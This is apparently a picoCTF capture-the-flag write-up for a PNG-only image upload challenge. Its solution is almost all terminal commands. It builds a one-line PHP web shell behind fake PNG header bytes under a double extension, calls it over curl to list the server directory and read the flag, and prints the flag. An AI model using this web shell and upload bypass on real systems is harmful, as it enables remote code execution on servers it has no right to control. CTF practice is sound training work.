I found a web app that can help process images: PNG images only!
## Solucion
```
┌──(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > exploit.png.php

┌──(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ cd ~

┌──(dastruker㉿MSI)-[~]
└─$ printf "\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system(\$_GET['cmd']); ?>" > exploit.png.php

┌──(dastruker㉿MSI)-[~]
└─$ pwd
ls -l exploit.png.php
/home/dastruker
-rw-r--r-- 1 dastruker dastruker 38 Sep 21 11:43 exploit.png.php

┌──(dastruker㉿MSI)-[~]
└─$ explorer.exe .

┌──(dastruker㉿MSI)-[~]
└─$ curl -s "http://atlas.picoctf.net:51203/uploads/exploit.png.php?cmd=ls%20-la%20.."
�PNG
␦
total 16
drwxrwxrwt 1 www-data www-data   21 Mar 11  2024 .
drwxr-xr-x 1 root     root       18 Nov 21  2023 ..
-rw-r--r-- 1 root     root       49 Mar 11  2024 MQZWCYZWGI2WE.txt
-rw-r--r-- 1 root     root     1572 Feb  7  2024 index.php
-rw-r--r-- 1 root     root      415 Feb  7  2024 instructions.txt
-rw-r--r-- 1 root     root       62 Feb  7  2024 robots.txt
drwxr-xr-x 1 www-data root       29 Sep 21 17:45 uploads

┌──(dastruker㉿MSI)-[~]
└─$ curl -s "http://atlas.picoctf.net:51203/uploads/exploit.png.php?cmd=cat%20../MQZWCYZWGI2WE.txt"
�PNG
␦
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b} */
```

## Notas Adicionales


## Referencias

